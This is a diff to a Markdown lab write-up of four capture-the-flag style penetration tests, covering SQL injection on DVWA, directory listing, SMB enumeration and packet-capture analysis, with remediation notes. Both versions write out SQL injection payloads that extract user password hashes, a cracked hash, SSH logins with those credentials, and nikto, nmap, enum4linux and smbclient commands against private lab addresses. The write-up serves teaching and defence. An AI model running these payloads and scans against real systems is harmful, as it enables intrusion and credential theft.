@@ -10,65 +10,86 @@ It covers four penetration testing challenges, the exact commands used, and reme
 
 | Challenge | Hostname       | IP Address       |
 |-----------|----------------|------------------|
-| DVWA SQLi | `dvwa.local`   | `192.168.56.101` |
-| Web Vuln  | `webvuln.local`| `192.168.56.102` |
-| SMB Vuln  | `smbvuln.local`| `192.168.56.103` |
-| PCAP Lab  | `pcap.local`   | `192.168.56.104` |
+| DVWA SQLi | `dvwa.local`   | `10.5.5.12` |
+| Web Vuln  | `dvma.local`| `10.5.5.12` |
+| SMB Vuln  | `gravemind.local`| `10.5.5.14` |
+| PCAP Lab  | `pcap.local`   | `10.5.5.12` |
 
 ---
 
 ## 🔥 Challenge 1 – SQL Injection (DVWA)
 
-### Steps
-```sql
-' OR '1'='1 --
-' UNION SELECT NULL,NULL,NULL --
-' UNION SELECT user,password,NULL FROM users --
-Crack Bob’s hash → password: qwerty
+### Objective
+Exploit a SQL Injection vulnerability to identify the database name, extract user credentials, and gain server access.
 
-SSH into target:
+### 💻 Exploitation Steps
+1. Database Enumeration Identify the database name using the DATABASE() function.
 
-bash
-ssh bob@192.168.56.101
-ls -la
-cat flag.txt
-Remediation
-Use prepared statements.
+### SQL
 
-Restrict DB privileges.
+`1' OR 1=1 UNION SELECT 1, DATABASE()#`
+- Result: Database name identified as dvwa.
 
-Apply strong hashing (bcrypt/Argon2).
+2. Column Enumeration Identify column names from the information_schema.
 
-Deploy WAF rules for SQLi detection.
+SQL
+
+`1' OR 1=1 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'#`
+- Result: Found sensitive columns: user_id, first_name, last_name, user, password.
+
+3. Data Extraction Extract usernames and password hashes.
+
+### SQL
+
+`1' OR 1=1 UNION SELECT user,password FROM users #`
+- Result: Found user smithy with hash 5f4dcc3b5aa765d61d8327deb882cf99 (Cracked: password).
+
+4. Server Access & Flag Retrieval
+
+```Bash
+
+# SSH into the target using the cracked credentials
+ssh smithy@192.168.8.18
+
+# Locate the flag file
+ls
+cat my_passwords.txt
+Flag Found: 8748wf83.
 ```
 
 ## 📂 Challenge 2 – Directory Listing
-```Steps
-bash
-nikto -h http://192.168.56.102/
-curl -s http://192.168.56.102/config/flag.txt
-````
-### Remediation
-* Disable directory listing (Options -Indexes).
+### Objective
+- Enumerate a web server to find sensitive directories and files exposed via misconfiguration.
 
-* Move configs outside web root.
+### 💻 Exploitation Steps
+1. Nikto Vulnerability Scan
 
-* Restrict access with authentication.
+Bash
 
-* Automate scans with Nikto/ZAP.
+`nikto -h 10.5.5.12`
+- Result: Nikto identified + /config/: Directory indexing found. and + /config/: Configuration information may be available remotely.
+
+2. Flag Retrieval Browsing to the identified directory reveals sensitive configuration files.
+
+### 🛡️ Remediation
+- Disable Directory Indexing: Set Options -Indexes in the Apache configuration to prevent users from browsing folder contents.
+
+- Restrict Access: Move configuration files outside the web root or restrict access via .htaccess.
+
+
 
 ## 📦 Challenge 3 – SMB Enumeration
-```Steps
-bash
-nmap -sV -p 139,445 192.168.56.103
-enum4linux -a 192.168.56.103
-smbclient //192.168.56.103/print -N
-# Inside smbclient
-ls
-get flag.txt
-quit
-cat flag.txt
-````
+### Objective
+- Identify open SMB ports and enumerate shares on the network.
+
+### 💻 Exploitation Steps
+1. Network Scanning with Nmap
+
+Bash
+
+`nmap -p 139,445 10.5.5.0/24`
+- Result: Target gravemind.pc (10.5.5.14) has ports 139/tcp netbios-ssn and 445/tcp microsoft-ds open.
+
 ### Remediation
 * Disable guest access.
 
@@ -79,20 +100,23 @@ cat flag.txt
 * Segment networks to limit exposure.
 
 ## Challenge 4 – Packet Capture Analysis
-Steps
-Open .pcap in Wireshark
+### Objective
+- Analyze a network capture to intercept sensitive data transmitted in cleartext.
 
-Filter:
+### 💻 Analysis Steps
+1. Wireshark Inspection
 
-Code
-http
-ip.addr == 192.168.56.104 && http
-http.request.method == "GET"
-Follow HTTP stream → /data/flag.txt
+- Open SA.pcap in Wireshark.
 
-```bash
-curl -s http://192.168.56.104/data/flag.txt
-```
+- Filter for http traffic.
+
+- Observe a GET /data/user_accounts.xml request from 10.5.5.11.
+
+2. Flag Retrieval Accessing the .xml file reveals the credential database.
+
+Path: http://10.5.5.11/data/user_accounts.xml
+
+Flag Found: z1z-1478K
 ### Remediation
 * Enforce HTTPS/TLS.
 
@@ -101,24 +125,3 @@ curl -s http://192.168.56.104/data/flag.txt
 * Harden server configs.
 
 * Monitor for cleartext leaks.
-
-### 🛠 Quick Reference Commands
-bash
-### Nikto scan
-```nikto -h http://192.168.56.102/```
-
-### Nmap SMB scan
-```nmap -sV -p 139,445 192.168.56.103```
-
-### Enum4linux
-````enum4linux -a 192.168.56.103````
-
-### SMB client
-`smbclient //192.168.56.103/print -N`
-
-### SSH login
-`ssh bob@192.168.56.101`
-
-# Curl retrieval
-`curl -s http://192.168.56.102/config/flag.txt`
-`curl -s http://192.168.56.104/data/flag.txt`
